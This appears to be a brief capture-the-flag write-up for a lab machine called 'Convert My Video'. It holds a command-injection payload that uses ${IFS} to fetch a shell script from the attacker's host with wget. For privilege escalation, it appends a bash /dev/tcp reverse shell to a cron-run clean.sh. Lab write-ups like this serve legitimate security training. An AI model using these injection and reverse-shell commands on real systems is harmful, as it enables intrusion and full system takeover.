# Convert My Video

## Reconnaissance

IP addr : 10.10.77.108

## Scanning & Enumeration

### Nmap Scan

result [here](nmap/initial)

### Directory Fuzzing

-/admin

## Exploitation

### RCE

```bash
 — version;wget${IFS}http://10.8.2.244:331/shell.sh;

```

root

```shell
echo "bash -i >& /dev/tcp/10.8.2.244/3302 0>&1" >> clean.sh
```
